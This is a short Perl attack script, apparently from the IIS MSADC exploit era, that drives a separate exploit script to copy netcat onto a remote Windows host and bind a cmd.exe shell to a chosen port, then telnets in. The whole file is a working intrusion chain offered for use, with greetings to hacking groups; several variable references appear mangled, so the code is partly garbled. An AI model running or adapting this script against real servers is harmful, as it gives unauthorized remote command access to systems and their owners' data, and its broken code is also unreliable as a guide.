#!/usr/bin/perl
# -- Spawn a command shell on remote host with MSADC
# -- Shouts to RFP of course, [sSh], computer club,
# -- dust puppy II, irc-servers.com, attrition.org,
# -- and hnn.com
# --
# -- rackmount. good fellaz.

# -- This is more or less a dirty script put together
# -- in 5 minutes.

# -- Add "+ +" to your .rhosts file (yes i know this
# -- will make you vulnerable to certain types of shit)
# -- and put nc.exe (netcat) in your home directory.

if (!([0])) { 
  print "spawncmd.pl [remote host] [my _REAL_ ip] [desired port]\n"; 
  exit; 
}

if (!([1])) { 
  print "spawncmd.pl [0] [my _REAL_ ip] [desired port]\n"; 
  exit; 
}

if (!([2])) { 
  print "spawncmd.pl [0] [1] [desired port]\n"; 
  exit; 
}

open(RHOST, "| ./msadc2.pl -h [0]");
print RHOST "rcp -b [1]./users/aholder/.shellrc{'USER'}:/users/aholder/.shellrc{'HOME'}/nc.exe .\n";
close RHOST;

# -- You may need to increase this depending on the connection
# -- between you and the other host
sleep 5;

open(RHOST, "| ./msadc2.pl -h [0]");
print RHOST "nc -l -p [2] -e cmd.exe\n";
close RHOST;

# -- After finished connecting you can take "+ +" out of
# -- your .rhosts file.

system("telnet [0] [2]");

# -- couriered by ubt! (ubt@ureach.com)
